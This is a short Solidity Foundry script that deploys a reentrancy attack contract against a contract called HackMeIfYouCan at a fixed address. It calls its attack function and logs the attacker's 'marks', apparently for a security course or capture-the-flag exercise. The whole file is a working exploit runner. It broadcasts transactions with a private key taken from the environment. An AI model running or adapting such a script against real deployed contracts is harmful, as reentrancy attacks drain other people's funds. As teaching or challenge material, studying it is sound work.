// SPDX-License-Identifier: MIT
pragma solidity 0.7.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/HackMeIfYouCan.sol";
import "../src/ReentranceAttack.sol";

contract Attack is Script {
    HackMeIfYouCan public hackMeContract;
    address payable public attacker;
    ReentranceAttack public reentranceAttack;

    function setUp() public {
        attacker = payable(vm.envAddress("PUBLIC_KEY"));
        vm.deal(attacker, 100 ether);
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Starting Attack...");

        hackMeContract = HackMeIfYouCan(0x9D29D33d4329640e96cC259E141838EB3EB2f1d9);
        console.log("HackMeIfYouCan contract deployed at:", address(hackMeContract));

        reentranceAttack = new ReentranceAttack{value: 0.0009 ether}(payable(address(hackMeContract)));
        console.log("ReentranceAttack contract deployed at:", address(reentranceAttack));

        reentranceAttack.attack();

        console.log("Marks after attack:", hackMeContract.getMarks(attacker));

        vm.stopBroadcast();
    }
}
